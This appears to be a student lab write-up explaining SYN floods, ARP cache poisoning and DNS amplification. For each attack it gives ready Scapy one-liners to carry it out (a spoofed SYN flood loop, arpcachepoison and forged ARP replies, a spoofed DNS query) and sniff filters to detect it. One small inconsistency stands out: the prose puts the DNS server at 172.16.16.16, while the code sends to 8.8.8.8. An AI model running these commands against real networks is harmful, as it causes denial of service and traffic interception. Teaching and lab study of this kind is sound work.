### 1, TCP/SYN Packet (TCP/SYN Flood)

###### Theoretical overview

A **SYN flood** is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.

Normally when a client attempts to start a TCP connection to a server, the client and server exchange a series of messages which normally runs like this:

1. The client requests a connection by sending a SYN (synchronize) message to the server.
2. The server acknowledges this request by sending SYN-ACK back to the client.
3. The client responds with an ACK, and the connection is established.

This is called the **TCP three-way handshake**, and is the foundation for every connection established using the TCP protocol.

A **SYN flood attack** works by not responding to the server with the expected ACK code. The malicious client can either simply not send the expected ACK, or by spoofing the source IP address in the SYN, causing the server to send the SYN-ACK to a falsified IP address - which will not send an ACK because it "knows" that it never sent a SYN.

The server will wait for the acknowledgement for some time, as simple network congestion could also be the cause of the missing ACK, but in an attack increasingly large numbers of half-open connections will bind resources on the server until no new connections can be made, resulting in a denial of service to legitimate traffic. Some systems may also malfunction badly or even crash if other operating system functions are starved of resources in this way.

###### Using Scapy for performing attacks.

	send(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/TCP(sport=RandShort(), dport=80), loop=1) 

Scapy generates TCP SYN packets at a constant rate to the victim with address 172.16.16.16 on port 80, sourced from random spoofed addresses within the allowed management network (10.0.0.0/8). Appending the loop=1 parameter to scapy's send() command instructs it to regenerate and retransmit the packet at a constant rate indefinitely. 

On the victim router, we can see that the TCP connection queue is immediately exhausted:

###### Using Scapy for monitoring attacks.

We can easily capture **tcp** packets with **"S" flag**:

	a = sniff(filter="tcp[tcpflags] & (tcp-syn) != 0")
	a.nsummary()

Displayed information:
	
	0000 Ether / IP / TCP 10.86.233.36:25701 > 172.16.16.16:www S
	0001 Ether / IP / TCP 10.155.28.58:56047 > 172.16.16.16:www S

### 2, ARP Poisoning.

###### Theoretical overview

**ARP (address resolution protocol)** operates by broadcasting a message across a network, to determine the Layer 2 address (MAC address) of a host with a predefined Layer 3 address (IP address). The host at the destination IP address sends a reply packet containing its MAC address. Once the initial ARP transaction is complete, the originating device then caches the ARP response, which is used within the Layer 2 header of packets that are sent to a specified IP address.

![ARP poisoning](http://hakipedia.com/images/MitM.png)

An **ARP Spoofing attack** is the egression of unsolicited ARP messages. These ARP messages contain the IP address of a network resource, such as the default gateway, or a DNS server, and replaces the MAC address for the corresponding network resource with its own MAC address. Network devices, by design, overwrite any existing ARP information in conjunction with the IP address, with the new, counterfeit ARP information. The attacker then takes the role of man in the middle; any traffic destined for the legitimate resource is sent through the attacking system. As this attack occurs on the lower levels of the OSI model, the end-user is oblivious to the attack occurrence.

**ARP Poisoning** is also capable of executing Denial of Service (DoS) attacks. The attacking system, instead of posing as a gateway and performing a man in the middle attack, can instead simply drop the packets, causing the clients to be denied service to the attacked network resource. The spoofing of ARP messages is the tributary principal of ARP Poisoning.

###### Using Scapy for performing attacks.

Exists high-level function that is already coded 'arpcachepoison'. That performs poison target's cache with (your MAC,victim's IP) couple.

	arpcachepoison('172.16.16.16', '10.0.0.1')

Will cause 172.16.16.16 to send the current host all packets originally intended for 10.0.0.1.

Also it can be done in different way by using standart functions:

	a = ARP()

Now, target and victims ip addresses are set.

	a.psrc=("10.0.0.1")
	a.pdst=("172.16.16.16")

Send packet.

	send(a)

###### Using Scapy for monitoring attacks.

We should capture `arp` packets:

	a =sniff(filter="arp")
	a.summary()
	
Result on target side looks like:

	Ether / ARP who has 172.16.16.16 says 10.0.0.1
	

### 3, DNS query (DNS Multiplication Attack)

###### Theoretical overview

A **DNS query** is the process of a networking device making an inquiry to get an IP address for a DNS name. 

The client computer will send a DNS query to one of their DNS servers. The DNS server looks in it's DNS database to tell whether it can answer the query authoritatively. If the DNS server can answer authoritatively, the DNS server answers the query and the DNS query process is complete... *further stages are not interested for us within the bounds of this task*.

###### Using Scapy for performing attacks.

	sr1(IP(src=RandIP('10.0.0.0/8'), dst='8.8.8.8')/UDP(sport=RandShort(),dport=53)/DNS(rd=1,qd=DNSQR(qname="fit.cvut.cz", qtype="AAAA")))
	
DNS query to the DNS server at 172.16.16.16 from fake network addresses. The request is about presence IPv6 records type AAAA for the domain fit.cvut.cz.

`rd=1` is telling that recursion is desired, and `sr1` is the send/receive function that only returns the first answered packet.

###### Using Scapy for monitoring attacks.

We should capture `udp` packets at `port 53`:

	a=sniff(filter="udp and port 53")
	a.summary();

Result is:

	Ether / IP / UDP / DNS Qry "fit.cvut.cz."
